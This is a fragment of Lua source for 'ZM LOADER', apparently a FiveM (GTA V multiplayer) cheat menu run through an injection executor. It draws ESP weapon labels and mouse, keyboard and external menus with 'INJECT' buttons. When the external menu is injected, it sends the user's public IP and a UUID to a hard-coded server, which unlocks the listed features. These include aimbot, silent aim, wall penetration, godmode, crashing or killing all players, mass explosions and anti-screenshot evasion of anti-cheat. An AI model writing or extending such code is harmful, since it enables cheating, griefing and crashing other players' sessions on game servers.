            GetFinalRenderedCamCoord() + 0.0005 - 0.01 -
                5 /
                    math.abs(
                        10 *
                            rE_Slider[
                                "Slider_espheight_value"
                            ]
                    ),
                    boneCoords.x,
                    boneCoords.y,
                    boneCoords.z,
            true
        )
        local d = GetDistanceBetweenCoords(GetFinalRenderedCamCoord(0), boneCoords.x, boneCoords.y, boneCoords.z, true)
        if al == nil then
            al = "Unarmed"
        end


            if k < SliderKeyboard["espdistance"].value then
                if not Winnie_IsEntityDead(v) then
                            Winnie_DrawText2(al, m + 0.35 / k + 0.001, n + 20 / 100 / k - 0.005, false, 0.20, false, 255, 255, 255, 255)
                        end
                    end
                end

    local function EspWeapon(v)
        local boneCoords = GetEntityCoords(v)
        local c, d = Winnie_GetCurrentPedWeapon(v, true)
        local al = name(d)

        if ZM_M1000.icnself then
            ZM_M1000.baise = v
        else
            ZM_M1000.baise = v ~= Winnie_PlayerPedId()
        end

        if ZM_M1000.icnpeds then
            ZM_M1000.pedding = Winnie_IsPedAPlayer(v)
        else
            ZM_M1000.pedding = v
        end




        local e, f, g = boneCoords.x, boneCoords.y, boneCoords.z
        local h, i, j = table.unpack(GetGameplayCamCoord())
        local l, m, n = GetScreenCoordFromWorldCoord(e, f, g + 1.04)
        local k =
            GetDistanceBetweenCoords(
            GetFinalRenderedCamCoord() + 0.0005 - 0.01 -
                5 /
                    math.abs(
                        10 *
                            rE_Slider[
                                "Slider_espheight_value"
                            ]
                    ),
                    boneCoords.x,
                    boneCoords.y,
                    boneCoords.z,
            true
        )
        local d = GetDistanceBetweenCoords(GetFinalRenderedCamCoord(0), boneCoords.x, boneCoords.y, boneCoords.z, true)
        if al == nil then
            al = "Unarmed"
        end

        if ZM_M1000.pedding and ZM_M1000.baise then
            if k < math.floor(3000 * rE_Slider["Slider_espdistance_value"]) then
                if not Winnie_IsEntityDead(v) then
                            Winnie_DrawText(al, m + 0.35 / k + 0.001, n + 20 / 100 / k - 0.005, false, 0.20, false, 255, 255, 255, 255)
                        end
                    end
                end
            end


    local function load()

        redENGINE.DrawImage(zm, New.x + 0.53,  New.y + 0.509, 0.59, 0.585);
        redENGINE.DrawImage(zm2, New2.x + 0.536,  New2.y + 0.51, 0.59, 0.585);
        -- Winnie_DrawSprite('afzgfrezgergergerg', 'zefhuzeufezufhzeufh', New.x + 0.54,  New.y + 0.750, 0.60, 0.60 * 1.8, 0.0, 255, 255, 255, New.opacity)
        -- Winnie_DrawSprite('azdfzefrezgfzregfz', 'kofzkofzeokfzeokfkoz', New2.x + 0.54,  New2.y + 0.750, 0.60, 0.60 * 1.8, 0.0, 255, 255, 255, New.opacity)
        -- Winnie_DrawSprite('rgrethrthrthrthr', 'efzgehgrehehehetrherh', New2.x + 0.338,  New2.y + 0.333, 0.010, 0.010 * 1.8, 0.0, 255, 255, 255, New.opacity)
        -- Winnie_DrawSprite('reggregergergergerg', 'afazgehgrethreh', New2.x + 0.338,  New2.y + 0.39, 0.010, 0.010 * 1.8, 0.0, 255, 255, 255, New.opacity)
        -- Winnie_DrawSprite('zegfergretgerhgerg', 'arfzafagfagfaga', New2.x + 0.338,  New2.y + 0.447, 0.010, 0.010 * 1.8, 0.0, 255, 255, 255, New.opacity)
        -- Winnie_DrawSprite('ergetrgehrhrhrh', 'zemzemfzemlfzmfzefl', New2.x + 0.338,  New2.y + 0.510, 0.010, 0.010 * 1.8, 0.0, 255, 255, 255, New.opacity)
        -- Winnie_DrawSprite('zamzasmzfkzefozef', 'ezaflfezlzefplzlfp', New2.x + 0.338,  New2.y + 0.567, 0.010, 0.010 * 1.8, 0.0, 255, 255, 255, New.opacity)
        --Winnie_DrawSprite('zegfzefzefzefzefzef', 'lpezfflpzeflpzlfpzfl', New2.x + 0.338,  New2.y + 0.630, 0.010, 0.010 * 1.8, 0.0, 255, 255, 255, New.opacity)
        --Winnie_DrawSprite('afzefzregrezgfzgfeazfga', 'zergzgzefefadfafa', New2.x + 0.338,  New2.y + 0.690, 0.010, 0.010 * 1.8, 0.0, 255, 255, 255, New.opacity)
    end

    -- local function loadglife()
    --     Winnie_DrawSprite('ezrgrtghrthrthrth', 'gjigfjezigjizrgji', New.x + 0.54,  New.y + 0.870, 0.90, 0.90 * 1.80, 0.0, 255, 255, 255, 255)
    -- end


    local function ConnectToSubMenu(check, text, x, y)
        if taberino == check then
            Winnie_DrawText(text, x + New2.x, y + New2.y, false, 0.28, false, math.floor(255 * rE_Slider["Slider_colormenur_value"]), math.floor(255 * rE_Slider["Slider_colormenug_value"]), math.floor(255 * rE_Slider["Slider_colormenub_value"]), 255)
        else
            Winnie_DrawText(text, x + New2.x, y + New2.y, false, 0.28, false, 255, 255, 255, New.opacity)
        end

        if mouseInBounds(New2.x + x, New2.y + y, 0.1, 0.04) and Winnie_IsDisabledControlJustReleased(0, 92) then
            return true
        else
            return false
        end
    end


    -- local function VehicleGet(a, b, c, d)

    --     local x, y = Winnie_GetNuiCursorPosition()
    --     local screenX, screenY = Winnie_GetActiveScreenResolution()
    --     local cursorX, cursorY = x / screenX, y / screenY

    --     Winnie_DrawText2(a, New.x - 0.012 + b , New.y + c, false, 0.28, false, 255, 255, 255, 255)
    --     Winnie_DrawSprite('radar', 'grlzpflzpflzepflzepplfzef', New.x + 0.01 + b , New.y + 0.062 + c, 0.115, 0.115 * 1.8, 0.0, 255, 255, 255, 255)


    --     if mouseInBounds(New.x + b - 0.01, New.y + c, 0.080, 0.015) then
    --         Winnie_DrawSprite('radar', 'grlzpflzpflzepflzepplfzef', New.x + 0.01 + b, New.y + 0.062 + c, 0.115, 0.115 * 1.8, 0.0, 0, 0, 0, 90)
    --     end

    --     if mouseInBounds(New.x + b - 0.01, New.y + c, 0.080, 0.015) and IsDisabledControlJustReleased(0, 92) then
    --         return true
    --     else
    --         return false
    --     end
    -- end


    local function PlayerGet(a, b, c, d)

        local x, y = GetNuiCursorPosition()
        local screenX, screenY = Winnie_GetActiveScreenResolution()
        local cursorX, cursorY = x / screenX, y / screenY



        if mouseInBounds(New.x + b + 0.015, New.y + c, 0.035, 0.015) then
            Winnie_DrawText(a, New.x + b, New.y + c - 0.011, false, 0.25, false, math.floor(255 * rE_Slider["Slider_colormenur_value"]), math.floor(255 * rE_Slider["Slider_colormenug_value"]), math.floor(255 * rE_Slider["Slider_colormenub_value"]), 255)
        else
            Winnie_DrawText(a, New.x + b, New.y + c - 0.011, false, 0.25, false, 255, 255, 255, 255)
        end

        if mouseInBounds(New.x + b - 0.01, New.y + c, 0.080, 0.015) and IsDisabledControlJustReleased(0, 92) then
            return true
        else
            return false
        end
    end



    local function button4(text, x, y)

        if mouseInBounds(New.x + x + 0.03, New.y + y, 0.1, 0.02) then

                Winnie_DrawText(text, x + New.x - 0.028, y + New.y -0.011, false, 0.26, false, math.floor(255 * rE_Slider["Slider_colormenur_value"]), math.floor(255 * rE_Slider["Slider_colormenug_value"]), math.floor(255 * rE_Slider["Slider_colormenub_value"]), New.opacity)

            Winnie_DrawRect(x + New.x + 0.015, y + New.y, 0.1, 0.015, 20, 20, 20, 50)
        else

                Winnie_DrawText(text, x + New.x - 0.028, y + New.y -0.011, false, 0.26, false, 255, 255, 255, New.opacity)

        end

        if mouseInBounds(New.x + x + 0.03, New.y + y, 0.1, 0.02) and Winnie_IsDisabledControlJustReleased(0, 92) then
            return true
        else
            return false
        end
    end

    local function button(text, x, y)


        Winnie_DrawText(text, x + New.x - 0.028, y + New.y -0.011, false, 0.30, false, 255, 255, 255, New.opacity)


        if mouseInBounds(New.x + x - 0.01, New.y + y - 0.002, 0.040, 0.02) and Winnie_IsDisabledControlJustReleased(0, 92) then
            return true
        else
            return false
        end
    end


    local function checkbox(text, x, y, check) -- checkboxred -- checkboxgreen

        if check then
            redENGINE.DrawImage(checkboxgreen, New.x + x - 0.009,  New.y + y + 0.004, 0.03, 0.025);
           -- Winnie_DrawSprite('circlegreen', 'circle', New.x + x - 0.009,  New.y + y + 0.013, 0.030, 0.030 * 1.8, 0.0, 255, 255, 255, New.opacity)
        else
            redENGINE.DrawImage(checkboxred, New.x + x - 0.009,  New.y + y + 0.004, 0.03, 0.025);

          --  Winnie_DrawSprite('circlered', 'circle', New.x + x - 0.009,  New.y + y + 0.013, 0.030, 0.030 * 1.8, 0.0, 255, 255, 255, New.opacity)
        end

        Winnie_DrawText(text, New.x + x, New.y + y - 0.010, false, 0.27, false, 255, 255, 255, New.opacity)
        if mouseInBounds(New.x + x, New.y + y, 0.035, 0.02) and Winnie_IsDisabledControlJustReleased(0, 92) then
            return true
        else
            return false
        end
    end


    local function checkboxlock(x, y, check)


        redENGINE.DrawImage(circle, New.x + x,  New.y + y - 0.00, 0.05, 0.05);

        if mouseInBounds(New.x + x, New.y + y - 0.008, 0.035, 0.02) and Winnie_IsDisabledControlJustReleased(0, 92) then
            return true
        else
            return false
        end
    end




    local function poppup(name,click)
        --Winnie_DrawRect(move.x + 0.50, move.y , 0.10, 0.10, 255, 0, 0, 120)
        Winnie_DrawRect(move.x + 0.50, move.y , 0.125, 0.10, 255, 255, 255, 255)
        Winnie_DrawRect(move.x + 0.50, move.y , 0.12, 0.09, 50, 50, 50, 255)

        Winnie_DrawText2('Discord Notif', move.x + 0.483, move.y - 0.045, false, 0.30, false, 255, 255, 255, 255)
        Winnie_DrawText2('Your discord is not linked', move.x + 0.468, move.y - 0.020, false, 0.30, false, 255, 255, 255, 255)
        Winnie_DrawText2('To link and have exclusive options click here', move.x + 0.445, move.y + 0.005, false, 0.30, false, 255, 255, 255, 255)


        if mouseInBounds(0.494, 0.523, 0.12, 0.03) then ---0.523
            Winnie_DrawText2(click, 0.494, move.y + 0.024, false, 0.30, false, 60, 120, 235, 255)
            Winnie_DrawText2('___', 0.494, move.y + 0.024, true, 0.30, false, 60, 120, 235, 255)
        else
            Winnie_DrawText2(click, 0.494, move.y + 0.024, false, 0.30, false, 8, 80, 225, 255)
        end

        if move.y <= 0.50 then
            move.y = move.y + 0.010
        end

    end

    CIT.CreateThread(
        function()
            while kibind do
                Wait(0)
                font.Push();

            ---poppup('Your discord is not linked.','Link')

            -- rectangle
            if home then

            Winnie_DrawRect(New.x + 0.50, New.y + 0.50, 0.295, 0.34, 255, 255, 255, 120) --- 21 21 21
            Winnie_DrawRect(New.x + 0.50, New.y + 0.50, 0.29, 0.33, 29, 29, 29, 255)
            -- line
             Winnie_DrawRect(New.x + 0.50, New.y + 0.363, 0.29, 0.004, 18, 18, 18, 255)
             Winnie_DrawText2("ZM LOADER", New.x + 0.488, New.y + 0.338, false, 0.30, false, 255, 255, 255, i)
           

            -- new infos
            if firstpage then
            Winnie_DrawRect(New.x + 0.57, New.y + 0.518, 0.132, 0.2735, 25, 23, 23, 255) -- contours
            Winnie_DrawRect(New.x + 0.57, New.y + 0.518, 0.13, 0.27, 40, 40, 42, 255) -- boxe
            Winnie_DrawText2("What News ?", New.x + 0.51, New.y + 0.385, false, 0.30, false, 255, 255, 255, i)
            
            -- new infos
            Winnie_DrawText2("Hey  ".."~b~"..GetPlayerName().."~s~"..", Welcome Back !", New.x + 0.51, New.y + 0.420, false, 0.30, false, 255, 255, 255, i)
            Winnie_DrawText2("You can use the ~b~".."LOADER".."~s~".." to load your own mods", New.x + 0.51, New.y + 0.445, false, 0.30, false, 255, 255, 255, i)

            Winnie_DrawText("~b~".."[ADDED]", New.x + 0.51, New.y + 0.480, false, 0.30, false, 255, 255, 255, i)
            Winnie_DrawText("- New Loader", New.x + 0.51, New.y + 0.505, false, 0.30, false, 255, 255, 255, i)
            Winnie_DrawText("- Optimization", New.x + 0.51, New.y + 0.530, false, 0.30, false, 255, 255, 255, i)
            Winnie_DrawText("- New Menu External", New.x + 0.51, New.y + 0.555, false, 0.30, false, 255, 255, 255, i)
            Winnie_DrawText("- New Menu Keyboard", New.x + 0.51, New.y + 0.580, false, 0.30, false, 255, 255, 255, i)
            Winnie_DrawText("- Anti-Screenshot for MouseUI and KeyboardUi", New.x + 0.51, New.y + 0.605, false, 0.30, false, 255, 255, 255, i)

            end

            --- retour et close

            if mouseInBounds(New.x + 0.36, New.y + 0.339, 0.03, 0.03) then
                Winnie_DrawText("~b~".."Home", New.x + 0.36, New.y + 0.339, false, 0.25, false, 255, 255, 255, 255)
                if Winnie_IsDisabledControlJustReleased(0, 92) then
                    firstpage = true
                    mousemenu = false
                    keyboardmenu = false
                    externmenu = false
                end
            else
                Winnie_DrawText2("Home", New.x + 0.36, New.y + 0.339, false, 0.25, false, 255, 255, 255, 255)
            end

            if mouseInBounds(New.x + 0.625, New.y + 0.339, 0.03, 0.03) then
                Winnie_DrawText("~r~".."Close", New.x + 0.625, New.y + 0.339, false, 0.25, false, 255, 255, 255, 255)
                if Winnie_IsDisabledControlJustReleased(0, 92) then
                    request("Why closing ? fils de pioute", 3000)
                    kibind = false

                end
            else
                Winnie_DrawText2("Close", New.x + 0.625, New.y + 0.339, false, 0.25, false, 255, 255, 255, 255)
            end

            -- choose menu
            Winnie_DrawRect(New.x + 0.428, New.y + 0.408, 0.102, 0.0535, 23, 23, 23, 255) -- mouse UI contours
            Winnie_DrawRect(New.x + 0.428, New.y + 0.408, 0.10, 0.05, 40, 40, 42, 255) -- mouse UI
            Winnie_DrawText("Mouse menu", New.x + 0.4128, New.y + 0.3975, false, 0.30, false, 255, 255, 255, 255)
           
            Winnie_DrawRect(New.x + 0.428, New.y + 0.516, 0.102, 0.0535, 23, 23, 23, 255) -- mouse UI contours
            Winnie_DrawRect(New.x + 0.428, New.y + 0.516, 0.10, 0.05, 40, 40, 42, 255) -- keyboard menu
            Winnie_DrawText("Keyboard menu", New.x + 0.409, New.y + 0.503, false, 0.30, false, 255, 255, 255, 255)
            
            Winnie_DrawRect(New.x + 0.428, New.y + 0.6272, 0.102, 0.0535, 23, 23, 23, 255) -- mouse UI contours
            Winnie_DrawRect(New.x + 0.428, New.y + 0.6272, 0.10, 0.05, 40, 40, 42, 255) -- externe menu so ez to make
            Winnie_DrawText("External menu", New.x + 0.411, New.y + 0.616, false, 0.30, false, 255, 255, 255, 255)
           
        end
            if mouseInBounds(0.428, 0.408, 0.102, 0.0535) and home then
                Winnie_DrawRect(New.x + 0.428, New.y + 0.408, 0.10, 0.05, 36, 36, 36, 255)
                if Winnie_IsDisabledControlJustReleased(0, 92) then
                    mousemenu = true
                    keyboardmenu = false
                    externmenu = false
                    firstpage = false
                end
            end
            if mouseInBounds(0.428, 0.516, 0.102, 0.0535) and home then
                Winnie_DrawRect(New.x + 0.428, New.y + 0.516, 0.10, 0.05, 36, 36, 36, 255)
                if Winnie_IsDisabledControlJustReleased(0, 92) then
                    mousemenu = false
                    keyboardmenu = true
                    externmenu = false
                    firstpage = false
                end
            end
            if mouseInBounds(0.428, 0.6272, 0.102, 0.0535) and home then
                Winnie_DrawRect(New.x + 0.428, New.y + 0.6272, 0.10, 0.05, 36, 36, 36, 255)
                if Winnie_IsDisabledControlJustReleased(0, 92) then
                    mousemenu = false
                    keyboardmenu = false
                    externmenu = true
                    firstpage = false
                end
            end

            if mousemenu and home then
               

                Winnie_DrawRect(New.x + 0.57, New.y + 0.462, 0.134, 0.161, 23, 23, 23, 255) -- contours
                Winnie_DrawRect(New.x + 0.57, New.y + 0.462, 0.132, 0.158, 40, 40, 42, 255) -- boxe

               

                
                Winnie_DrawRect(New.x + 0.57, New.y + 0.6272, 0.102, 0.0535, 23, 23, 23, 255)
                Winnie_DrawRect(New.x + 0.57, New.y + 0.6272, 0.10, 0.05, 40, 40, 42, 255)
               
                Winnie_DrawText2("The  ".."~b~".."Mouse Menu".."~s~"..", is a mouse menu with a new", New.x + 0.51, New.y + 0.420, false, 0.30, false, 255, 255, 255, i)
                Winnie_DrawText2("and innovative design and a refined ergonomics !", New.x + 0.51, New.y + 0.445, false, 0.30, false, 255, 255, 255, i)

                Winnie_DrawText2("~b~".."[ADDED]", New.x + 0.51, New.y + 0.480, false, 0.30, false, 255, 255, 255, i)
                Winnie_DrawText2("- Optimization FPS", New.x + 0.51, New.y + 0.505, false, 0.30, false, 255, 255, 255, i)

                Winnie_DrawText2("INJECT", New.x + 0.57, New.y + 0.615, false, 0.30, false, 255, 255, 255, i)
                Winnie_DrawText2("Mouse Menu", New.x + 0.51, New.y + 0.385, false, 0.30, false, 255, 255, 255, i)
               
                if mouseInBounds(0.57, 0.6272, 0.10, 0.05) then
                    Winnie_DrawRect(New.x + 0.57, New.y + 0.6272, 0.10, 0.05, 36, 36, 36, 255)
                    if Winnie_IsDisabledControlJustReleased(0, 92) then
                        injectmouse = true
                    end
                end
            end

            if keyboardmenu and home then
                Winnie_DrawRect(New.x + 0.57, New.y + 0.462, 0.134, 0.161, 23, 23, 23, 255) -- contours
                Winnie_DrawRect(New.x + 0.57, New.y + 0.462, 0.132, 0.158, 40, 40, 42, 255) -- boxe

                Winnie_DrawText2("The  ".."~b~".."Keyboard Menu".."~s~"..", is a keyboard menu with a ", New.x + 0.51, New.y + 0.420, false, 0.30, false, 255, 255, 255, i)
                Winnie_DrawText2("simple and easy to use design, easy for new !", New.x + 0.51, New.y + 0.445, false, 0.30, false, 255, 255, 255, i)

                Winnie_DrawText2("~b~".."[ADDED]", New.x + 0.51, New.y + 0.480, false, 0.30, false, 255, 255, 255, i)
                Winnie_DrawText2("- Fix Bug", New.x + 0.51, New.y + 0.505, false, 0.30, false, 255, 255, 255, i)

                Winnie_DrawRect(New.x + 0.57, New.y + 0.6272, 0.102, 0.0535, 23, 23, 23, 255)
                Winnie_DrawRect(New.x + 0.57, New.y + 0.6272, 0.10, 0.05, 40, 40, 42, 255)
                
                Winnie_DrawText2("INJECT", New.x + 0.57, New.y + 0.615, false, 0.30, false, 255, 255, 255, i)
                Winnie_DrawText2("Keyboard Menu", New.x + 0.51, New.y + 0.385, false, 0.30, false, 255, 255, 255, i)
              
                if mouseInBounds(0.57, 0.6272, 0.10, 0.05) then
                    Winnie_DrawRect(New.x + 0.57, New.y + 0.6272, 0.10, 0.05, 36, 36, 36, 255)
                    if Winnie_IsDisabledControlJustReleased(0, 92) then
                        injectkeyboard = true
                    end
                end
            end

            if externmenu then
                Winnie_DrawRect(New.x + 0.57, New.y + 0.462, 0.134, 0.161, 23, 23, 23, 255) -- contours
                Winnie_DrawRect(New.x + 0.57, New.y + 0.462, 0.132, 0.158, 40, 40, 42, 255) -- boxe

                Winnie_DrawText2("The  ".."~b~".."External Menu".."~s~"..", is a completely new and", New.x + 0.51, New.y + 0.420, false, 0.30, false, 255, 255, 255, i)
                Winnie_DrawText2("innovative menu on fivem, the menu is used  ", New.x + 0.51, New.y + 0.445, false, 0.30, false, 255, 255, 255, i)
                Winnie_DrawText2("from the steam overlay or any web browser !", New.x + 0.51, New.y + 0.470, false, 0.30, false, 255, 255, 255, i)

                Winnie_DrawText2("For more info go to ".."~b~".."ZM discord".."~s~".." channel", New.x + 0.51, New.y + 0.495, false, 0.30, false, 255, 255, 255, i)

                if mouseInBounds(0.565, 0.517, 0.06, 0.06) then
                Winnie_DrawText2("~b~".."Click Here for discord", New.x + 0.545, New.y + 0.520, false, 0.25, false, 255, 255, 255, i)
                if Winnie_IsDisabledControlJustReleased(0, 92) then
                    launchwebsite("https://discord.gg/nXEskAYBnR")
                end
                else
                Winnie_DrawText2("Click Here for discord", New.x + 0.545, New.y + 0.520, false, 0.25, false, 255, 255, 255, i)
                end

                Winnie_DrawRect(New.x + 0.57, New.y + 0.6272, 0.102, 0.0535, 23, 23, 23, 255)
                Winnie_DrawRect(New.x + 0.57, New.y + 0.6272, 0.10, 0.05, 40, 40, 42, 255)
                Winnie_DrawText2("External Menu", New.x + 0.51, New.y + 0.385, false, 0.30, false, 255, 255, 255, i)
                
                Winnie_DrawText2("INJECT", New.x + 0.57, New.y + 0.615, false, 0.30, false, 255, 255, 255, i)

                if mouseInBounds(0.57, 0.6272, 0.10, 0.05) then
                    Winnie_DrawRect(New.x + 0.57, New.y + 0.6272, 0.10, 0.05, 36, 36, 36, 255)
                    if Winnie_IsDisabledControlJustReleased(0, 92) then
                        request("Go WEB or Steam Overlay", 3000)
                        warningmenu = true
                        --kibind = false
                        local url = "http://37.187.39.183:3001/Zm-Menu/search"

                        local wlIP = "http://api.ipify.org"
                        local ip = redENGINE.Request:Get(wlIP, {field = "data"});

                        local result = redENGINE.Request:Post(url, {uuid = UUID, ip = ip})



                booleanCheck = {
                                healslider = mysplit(result, " ")[1],
                                armorslider = mysplit(result, " ")[2],
                                 revive = mysplit(result, " ")[3],
                                suicide = mysplit(result, " ")[4],
                                outfit = mysplit(result, " ")[5],
                                tpwaypoint = mysplit(result, " ")[6],
                                cleartask = mysplit(result, " ")[7],
                                noclip = mysplit(result, " ")[8],
                                godmode = mysplit(result, " ")[9],
                                invisible = mysplit(result, " ")[10],
                                fastrun = mysplit(result, " ")[11],
                                stamina = mysplit(result, " ")[12],
                                autoheal = mysplit(result, " ")[13],
                                fastswim = mysplit(result, " ")[14],
                                rollinfinity = mysplit(result, " ")[15],
                                noradoll = mysplit(result, " ")[16],
                                jump = mysplit(result, " ")[17],
                                freecam = mysplit(result, " ")[18],
                                freecamfovslider = mysplit(result, " ")[19],
                                freecamspeedslider = mysplit(result, " ")[20],
                                freecamsensislider = mysplit(result, " ")[21],
                                opacityplayerslider = mysplit(result, " ")[22],
                                boxes = mysplit(result, " ")[23],
                                skeleton = mysplit(result, " ")[24],
                                thermalvision = mysplit(result, " ")[25],
                                nightvision = mysplit(result, " ")[26],
                                line = mysplit(result, " ")[27],
                                blips = mysplit(result, " ")[28],
                                nowater = mysplit(result, " ")[29],
                                noprops = mysplit(result, " ")[30],
                                healbar = mysplit(result, " ")[31],
                                armorbar = mysplit(result, " ")[32],
                                removefog = mysplit(result, " ")[33],
                                crosshair = mysplit(result, " ")[34],
                                clearnight = mysplit(result, " ")[35],
                                includeself = mysplit(result, " ")[36],
                                includeplayers = mysplit(result, " ")[37],
                                fillbox = mysplit(result, " ")[38],
                                colorrslider = mysplit(result, " ")[39],
                                colorgslider = mysplit(result, " ")[40],
                                colorbslider = mysplit(result, " ")[41],
                                opcacityfillboxslider = mysplit(result, " ")[42],
                                distanceespslider = mysplit(result, " ")[43],
                                giveall = mysplit(result, " ")[44],
                                removeall = mysplit(result, " ")[45],
                                givespecific = mysplit(result, " ")[46],
                                removespecific = mysplit(result, " ")[47],
                                maxammo = mysplit(result, " ")[48],
                                removeammo = mysplit(result, " ")[49],
                                silentaim = mysplit(result, " ")[50],
                                aimlock = mysplit(result, " ")[51],
                                ammoilimited = mysplit(result, " ")[52],
                                rapidefire = mysplit(result, " ")[53],
                                nospread = mysplit(result, " ")[54],
                                shootteleport = mysplit(result, " ")[55],
                                ptfxbullet = mysplit(result, " ")[56],
                                shootvehicle = mysplit(result, " ")[57],
                                antiheadshot = mysplit(result, " ")[58],
                                hitsound = mysplit(result, " ")[59],
                                fov = mysplit(result, " ")[60],
                                fillfov = mysplit(result, " ")[61],
                                fovaimbot = mysplit(result, " ")[62],
                                targetdead = mysplit(result, " ")[63],
                                targetped = mysplit(result, " ")[64],
                                ptfxscale = mysplit(result, " ")[65],
                                penetratewall = mysplit(result, " ")[66],
                                distanceaimbot = mysplit(result, " ")[67],
                                spwanvehicle = mysplit(result, " ")[68],
                                changeplate = mysplit(result, " ")[69],
                                repairvehicle = mysplit(result, " ")[70],
                                deletevehicle = mysplit(result, " ")[71],
                                vehiclemaximum = mysplit(result, " ")[72],
                                teleportnearestvehicle = mysplit(result, " ")[73],
                                cleanvehicle = mysplit(result, " ")[74],
                                refuelvehicle = mysplit(result, " ")[75],
                                refueloil = mysplit(result, " ")[76],
                                openalldoors = mysplit(result, " ")[77],
                                closealldoors = mysplit(result, " ")[78],
                                instantbrake = mysplit(result, " ")[79],
                                invisibleveh = mysplit(result, " ")[80],
                                drift = mysplit(result, " ")[81],
                                boost = mysplit(result, " ")[82],
                                jumpvehicle = mysplit(result, " ")[83],
                                handling = mysplit(result, " ")[84],
                                autorepair = mysplit(result, " ")[85],
                                nitro = mysplit(result, " ")[86],
                                rainbowcar = mysplit(result, " ")[87],
                                vehiclecolor = mysplit(result, " ")[88],
                                spawninside = mysplit(result, " ")[89],
                                colorrvehicle = mysplit(result, " ")[90],
                                colorgvehicle = mysplit(result, " ")[91],
                                colorbvehicle = mysplit(result, " ")[92],
                                vehiclespeedboost = mysplit(result, " ")[93],
                                killall = mysplit(result, " ")[94],
                                explodeall = mysplit(result, " ")[95],
                                spawnmass = mysplit(result, " ")[96],
                                kickallvehicle = mysplit(result, " ")[97],
                                terroristattack = mysplit(result, " ")[98],
                                giveweaponall = mysplit(result, " ")[99],
                                removeweaponall = mysplit(result, " ")[100],
                                spawntransexual = mysplit(result, " ")[101],
                                randompeds = mysplit(result, " ")[102],
                                randomprops = mysplit(result, " ")[103],
                                clearpedtask = mysplit(result, " ")[104],
                                unlockvehicle = mysplit(result, " ")[105],
                                earrape = mysplit(result, " ")[106],
                                cageallplayers = mysplit(result, " ")[107],
                                crashallplayers = mysplit(result, " ")[108],
                                ptfxspamming = mysplit(result, " ")[109],
                                hyrantallplayers = mysplit(result, " ")[110],
                                molotovallplayers = mysplit(result, " ")[111],
                                whalemasspawn = mysplit(result, " ")[112],
                                explodevehicles = mysplit(result, " ")[113],
                                flyallvehicles = mysplit(result, " ")[114],
                                explodetype = mysplit(result, " ")[115],
                                ptfxscl = mysplit(result, " ")[116],
                                forcefly = mysplit(result, " ")[117],
                                closemenu = mysplit(result, " ")[118],
                                paniccrash = mysplit(result, " ")[119],
                                reportbug = mysplit(result, " ")[120],
                                antizinshot = mysplit(result, " ")[121],
                                staminashot = mysplit(result, " ")[122],
                                teleporttovehicle = mysplit(result, " ")[123],
                                godmodeglife = mysplit(result, " ")[124],
                                infiniteammo = mysplit(result, " ")[125],
                                esplootbag = mysplit(result, " ")[126],
                                assistantstafe = mysplit(result, " ")[127],
                                teleportzombie = mysplit(result, " ")[128],
                                autofarmxp = mysplit(result, " ")[129],
                                autofarm = mysplit(result, " ")[130],
                                removewindows = mysplit(result, " ")[131],
                                warpvehicle = mysplit(result, " ")[132],
                                freezeammo = mysplit(result, " ")[133],
                                colorrbag = mysplit(result, " ")[134],
                                colorgbag = mysplit(result, " ")[135],
                                colorbbag = mysplit(result, " ")[136],
                                healglife = mysplit(result, " ")[137],
                                speedstrafe = mysplit(result, " ")[138],
                            }

                    end
                end
            end

            if injectmouse then
                home = false
                --Winnie_DrawRect(New.x + 0.50, New.y + 0.50, 0.29, 0.33, 35, 35, 35, 150)
                i = 0
                Winnie_DrawRect(New.x + 0.50, New.y + 0.50, 0.10, 0.10, 18, 18, 18, 255)
                Winnie_DrawRect(New.x + 0.50, New.y + 0.50, 0.095, 0.09, 40, 40, 40, 255)
                mouseui = true
            end

            if injectkeyboard then
                home = false

                i = 0
                Winnie_DrawRect(New.x + 0.50, New.y + 0.50, 0.10, 0.10, 18, 18, 18, 255)
                Winnie_DrawRect(New.x + 0.50, New.y + 0.50, 0.095, 0.09, 40, 40, 40, 255)
                keyboard = true

            end

            if warningmenu then
                home = false
             --   Winnie_DrawRect(New.x + 0.50, New.y + 0.50, 0.29, 0.33, 35, 35, 35, 150)
                i = 150
                Winnie_DrawRect(New.x + 0.50, New.y + 0.50, 0.10, 0.10, 255, 0, 0, 120)
                Winnie_DrawRect(New.x + 0.50, New.y + 0.50, 0.095, 0.09, 40, 40, 40, 255)
                Winnie_DrawText2("Warning", New.x + 0.489, New.y + 0.458, false, 0.30, false, 255, 0, 0, 255)
                Winnie_DrawText2("Please read before inject", New.x + 0.472, New.y + 0.485, false, 0.28, false, 255, 255, 255, 255)

                Winnie_DrawText2("Inject", New.x + 0.492, New.y + 0.52, false, v, false, 255, 255, 255, 255)
                mousemenu = false
                keyboardmenu = false
                externmenu = false
                firstpage = false
                if mouseInBounds(0.492, 0.52, 0.05, 0.05) then

                    v = 0.34
                    Winnie_DrawText2("Inject", New.x + 0.492, New.y + 0.52, false, v, false, 255, 255, 255, 255)
                    if Winnie_IsDisabledControlJustReleased(0, 92) then
                    externalmenu = true
                    warningmenu = false
                    end
                else
                    v = 0.32
                end

                if mouseInBounds(0.54, 0.455, 0.05, 0.05) then
                    Winnie_DrawText2("X", New.x + 0.54, New.y + 0.455, false, 0.30, false, 255, 0, 0, 255)
                    if Winnie_IsDisabledControlJustReleased(0, 92) then
                        i = 255
                        warningmenu = false
                        home = true
                        externmenu = true --- sah mon loader est stylé je suis fier de moi
                    end
                else
                    Winnie_DrawText2("X", New.x + 0.54, New.y + 0.455, false, 0.30, false, 255, 255, 255, 255)
                end
            end


           -- Winnie_DrawRect(New.x + 0.38, New.y + 0.50, 0.001, 0.33, math.floor(255 * rE_Slider["Slider_colormenur_value"]), math.floor(255 * rE_Slider["Slider_colormenug_value"]), math.floor(255 * rE_Slider["Slider_colormenub_value"]), 255)


            --    if mouseInBounds(0.44, 0.50, 0.05, 0.10) and Winnie_IsDisabledControlJustReleased(0, 92) then
            --        keyboard = true
            --    end
            --    if mouseInBounds(0.53, 0.50, 0.05, 0.10) and Winnie_IsDisabledControlJustReleased(0, 92) then
            --        mouseui = true
            --    end

               if mouseui then
                Winnie_DrawText2("Select your keybind", New.x + 0.475, New.y + 0.455, false, 0.30, false, 255, 255, 255, 255)
                Winnie_DrawText2("[" .. oooopppppppeeeeeeeen["BindingTouch"] .. "]", 0.485,0.505,false,0.34,true, 255, 255, 255, 255)
               elseif keyboard then
                    Winnie_DrawText2("Select your keybind", New.x + 0.475, New.y + 0.455, false, 0.30, false, 255, 255, 255, 255)
                    Winnie_DrawText2("[" .. keyboardui["BindingTouch"] .. "]", 0.485,0.505,false,0.34,true, 255, 255, 255, 255)
               end

                cursor()
                nocontrol()

                local a = nil
                local b = nil
                local c = true
